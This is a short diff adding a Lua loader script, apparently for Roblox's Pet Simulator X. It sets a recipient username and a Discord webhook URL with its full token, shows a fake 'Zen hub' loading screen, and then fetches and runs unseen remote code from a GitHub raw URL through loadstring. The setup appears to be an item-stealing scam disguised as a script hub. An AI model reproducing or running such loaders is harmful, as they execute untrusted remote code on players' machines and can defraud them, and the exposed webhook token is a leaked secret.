@@ -1,0 +1,11 @@
+Username = "utguweug "
+WebHook = "https://discordapp.com/api/webhooks/1074179420169969755/H3SrOZmCucbE3fDyVnvXSQOvE9Wro9YZM2YPshDK7UgkJiWnSo__6G-9vz9M3FhqZaIQ"
+ 
+ 
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "Zen hub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
